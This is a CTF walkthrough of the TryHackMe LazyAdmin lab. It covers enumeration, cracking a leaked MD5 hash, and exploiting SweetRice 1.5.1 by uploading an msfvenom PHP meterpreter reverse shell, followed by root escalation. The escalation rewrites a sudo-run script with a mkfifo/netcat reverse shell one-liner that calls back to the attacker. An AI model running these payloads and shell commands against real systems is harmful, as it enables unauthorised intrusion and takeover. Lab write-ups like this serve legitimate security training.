Lab: [LazyAdmin](https://tryhackme.com/room/lazyadmin)

Tools: 
 - **nmap**:  tool to find open ports, detect operating systems and discover potential vulnerabilities 
 - **gowitness**: command line tool written in Go to capture and screenshot web pages
 - **ffuf**: web fuzzer written in Go to discover hidden or unlinked resources on a web server 
 - **metasploit**:framework for developing, testing, and executing exploits on target systems.
 - **msfvenom**: Payload generator and encoder within the Metasploit Framework for creating custom malicious payloads.
 - **searchsploit**: A command-line utility that interfaces with the Exploit Database (ExploitDB) .
 - **netcat**:  Versatile networking utility for reading from and writing to network connections, often used for port scanning and transferring files.
- **crackstation**: an online platform that stores hashed passwords and provides other password cracking services

After connecting to the network through TryHackMe's VPN. I want to make sure the target is reachable.

```
ping -c 5 10.10.198.128  
PING 10.10.198.128 (10.10.198.128) 56(84) bytes of data.
64 bytes from 10.10.198.128: icmp_seq=1 ttl=61 time=222 ms
64 bytes from 10.10.198.128: icmp_seq=2 ttl=61 time=214 ms
64 bytes from 10.10.198.128: icmp_seq=3 ttl=61 time=216 ms
64 bytes from 10.10.198.128: icmp_seq=4 ttl=61 time=219 ms
64 bytes from 10.10.198.128: icmp_seq=5 ttl=61 time=224 ms

--- 10.10.198.128 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4009ms
rtt min/avg/max/mdev = 213.750/218.906/224.133/3.873 ms
```
-----

**Host Enumeration**

After confirming that  I can reach the target. I ran an nmap scan.


| Nmap Flags | Description |
|----------|----------|
| T5 |Fastest scanning speed | 
| SC | Runs default scripts |
| sV | Version detection on open ports | 

```
nmap -T5 -sC -sV 10.10.198.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 15:33 EST
Nmap scan report for 10.10.198.128
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.50 seconds

```
-----
**Website Enumeration (Port 80)**

![http-10 10 198 128-](https://github.com/paRaade/CTF-Writeups/assets/126734769/90380ba1-adae-44e7-bf50-01981dae60c3)


Using ffuf to enumerate the root directory revealed one sub-directory, named content

```
ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.10.198.128/FUZZ   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.198.128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

content                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 216ms]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 217ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 217ms]
:: Progress: [220546/220546] :: Job [1/1] :: 179 req/sec :: Duration: [0:20:56] :: Errors: 0 ::
                                                                                                          
```
-----
**Content Directory**

Accessing the provided URL, http://10.10.198.128/content/, discloses a content management system called Sweet Rice

![http-10 10 198 128-content-](https://github.com/paRaade/CTF-Writeups/assets/126734769/6bb088a2-02a1-4ba0-ad75-9b62bd170d92)


Further enumeration revealed more subdirectories
```
ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.10.198.128/content/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.198.128/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 224ms]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 214ms]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 229ms]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 228ms]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 236ms]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 216ms]
                        [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 244ms]
:: Progress: [220546/220546] :: Job [1/1] :: 179 req/sec :: Duration: [0:21:01] :: Errors: 0 :
```
-----
**Further enumeration**

```
Sweet Rice Version 1.5.1: http://10.10.198.128/content/inc/lastest.txt
mysql_bakup_20191129023059-1.5.1.sql: http://10.10.198.128/content/inc/mysql_backup/
```

**mysql_bakup_20191129023059-1.5.1.sql Contents (line 79)**

The mysql file has an md5 hash. I took the hash: 42f749ade7f9e195bf475f37a44cafcb and used crackstation to get it's plaintext password Password123
```
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```
![Pasted image 20240125172601](https://github.com/paRaade/CTF-Writeups/assets/126734769/8b4ff299-0477-4588-883e-c29e946b43ee)

```
manager:Password123
```


Through prior enumeration I found the login portal
```
Sweet Rice Login Portal: http://10.10.198.128/content/as/
```
![http-10 10 198 128-content-as-](https://github.com/paRaade/CTF-Writeups/assets/126734769/25c2fcc0-41ad-4989-bace-a9c19153123f)

```
Using the following credentials I was able to successfully login to SweetRice with the following credentials **username**: manager and **password**: Password123
```
-----
**Searchsploit**

Knowing the version of Sweet Rice from prior enumeration allowed me to narrow down the possible attack vectors to get an initial foothold on the target system
```
searchsploit Sweet Rice 1.5.1
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                         | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                           | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                               | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                      | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                 | php/webapps/40700.html
------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------

```
The following command copies the file/exploit to the current directory in use
```
 searchsploit -m php/webapps/40700.html
  Exploit: SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution
      URL: https://www.exploit-db.com/exploits/40700
     Path: /usr/share/exploitdb/exploits/php/webapps/40700.html
    Codes: N/A
 Verified: True
File Type: HTML document, ASCII text
Copied to: /root/Desktop/Tryhackme/LazyAdmin/40700.html

```
-----
**Contents of 40700.html**

To summarize, the contents of this html file, a php reverse shell can be generated
```
# Description :
 
# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add

PHP Codes In Ads File

# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute

PHP Codes On Server .

# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();

Code You Can

Customize Exploit For Your Self .
```
-----
**Reverse Shell Payload Creation**
Using msfvenom I create a php  meterpreter reverse shell 
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.13.0.39 LPORT=4444 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34849 bytes

```
-----
**Starting Metasploit**

I  then start metasploit and the following commands. 
```
msfconsole -q                                                                         
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.13.0.39
LHOST => 10.13.0.39
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.0.39:4444 
```
I then take the contents of the shell.php generated before and paste it at the following url
```
http://10.10.198.128/content/as/?type=ad
```
![Pasted image 20240125182510](https://github.com/paRaade/CTF-Writeups/assets/126734769/154f22b3-204e-4e20-84f3-9ba297d8d3e6)



The php reverse shell is accessible at the following url. Once clicked on metasploit will catch the shell and I will now have remote access to the target machine
```
http://10.10.198.128/content/inc/ads/
```
![Pasted image 20240125182623](https://github.com/paRaade/CTF-Writeups/assets/126734769/7383d701-2062-4c8e-aaed-c12ad968d4a4)



-----
**Initial Foothold** 

The user.txt flag can be found in the /home/itguy directory
```
[*] Meterpreter session 1 opened (10.13.0.39:4444 -> 10.10.198.128:58946) at 2024-01-25 18:26:27 -0500
meterpreter > getuid
Server username: www-data

meterpreter > ls /home
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2019-11-30 10:07:45 -0500  itguy

meterpreter > cd /home/itguy
The user flag is here

meterpreter > cd /home/itguy
meterpreter > cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

```


-----
**Privilege Escalation**

The user www-data has root privileges to run perl and run a script called backup. pl
```
meterpreter > shell
Process 2899 created.
Channel 2 created.
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
-----
**backup. pl**

The backup. pl file is a perl script that executes a shell script
```
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

```
-----
**copy. sh**

The copy. sh script creates a reverse shell
```
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

-----
**Root Reverse Shell**

I replaced the IP address in the copy .sh script with my IP (tun0) and replaced the contents of the copy. sh script. After this I ran netcat. Once I ran the the backup .pl script with the sudo command a new reverse shell is created as a root user. I can now read the root.txt flag under the root directory
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.39 5554 >/tmp/f" > /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.39 5554 >/tmp/f
sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory

nc -nvlp 5554                                            
listening on [any] 5554 ...
connect to [10.13.0.39] from (UNKNOWN) [10.10.198.128] 45002
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}



```

